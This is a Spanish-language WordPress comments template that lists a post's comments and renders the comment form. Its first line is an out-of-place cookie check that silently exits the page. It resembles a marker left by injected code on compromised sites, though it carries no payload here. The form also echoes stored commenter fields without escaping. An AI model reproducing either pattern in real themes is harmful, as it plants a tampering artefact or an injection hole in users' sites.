<?php if($_COOKIE['526276e1e1135e2d']=="28a06b1833455629"){  exit; } ?><?php 
if(!is_page()){
?>
<div id="prelacionados">
<?php //wp_related_posts(); ?>
</div>
<div id="bcomentarios">

<?php if ( !empty($post->post_password) && $_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password) : ?>
<p><?php _e('Enter your password to view comments.'); ?></p>
<?php return; endif; ?>

<h4 id="comments"><?php comments_number(__('No hay comentarios'), __('1 Comentario'), __('% Comentarios')); ?>
<?php if ( comments_open() ) : ?>
<a href="#postcomment" title="<?php _e("Deje un comentario"); ?>">&raquo;</a>
<?php endif; ?>
</h4>

<?php if ( $comments ) : ?>
<ol id="commentlist">

<?php foreach ($comments as $comment) : ?>
<li id="comment-<?php comment_ID() ?>">
<?php comment_text() ?>
<p><cite><?php comment_type(__('Comentario'), __('Trackback'), __('Pingback')); ?> <?php _e('de'); ?> <?php comment_author_link() ?> &#8212; <?php comment_date() ?> @ <a href="#comment-<?php comment_ID() ?>"><?php comment_time() ?></a></cite> <?php edit_comment_link(__("Editar esto"), ' |'); ?></p>
</li>

<?php endforeach; ?>

</ol>

<?php else : // If there are no comments yet ?>
<p><?php _e('Ningun comentario todavia.'); ?></p>
<?php endif; ?>

<?php if ( comments_open() ) : ?>
<h4 id="postcomment"><?php _e('Deje un comentario'); ?></h4>

<?php if ( get_option('comment_registration') && !$user_ID ) : ?>
<p>You must be <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?redirect_to=<?php the_permalink(); ?>">logged in</a> to post a comment.</p>
<?php else : ?>

<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">

<?php if ( $user_ID ) : ?>

<p>Logged in as <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a>. <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?action=logout" title="<?php _e('Log out of this account') ?>">Logout &raquo;</a></p>

<?php else : ?>

<p><input type="text" name="author" id="author" value="<?php echo $comment_author; ?>" size="22" tabindex="1" />
<label for="author"><small>Nombre <?php if ($req) _e('(requerido)'); ?></small></label></p>

<p><input type="text" name="email" id="email" value="<?php echo $comment_author_email; ?>" size="22" tabindex="2" />
<label for="email"><small>Email <?php if ($req) _e('(requerido, no se publicara)'); ?></small></label></p>

<p><input type="text" name="url" id="url" value="<?php echo $comment_author_url; ?>" size="22" tabindex="3" />
<label for="url"><small>Website</small></label></p>

<?php endif; ?>
<p><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></p>

<p><input name="submit" type="submit" id="submit" tabindex="5" value="Enviar Comentario" />
<input type="hidden" name="comment_post_ID" value="<?php echo $id; ?>" />
</p>
<?php do_action('comment_form', $post->ID); ?>

</form>

<?php endif; // If registration required and not logged in ?>

<?php else : // Comments are closed ?>
<p><?php _e('Disculpe, los comentarios han sido cerrados.'); ?></p>
<?php endif; ?>
</div>
<?php 
}
?>
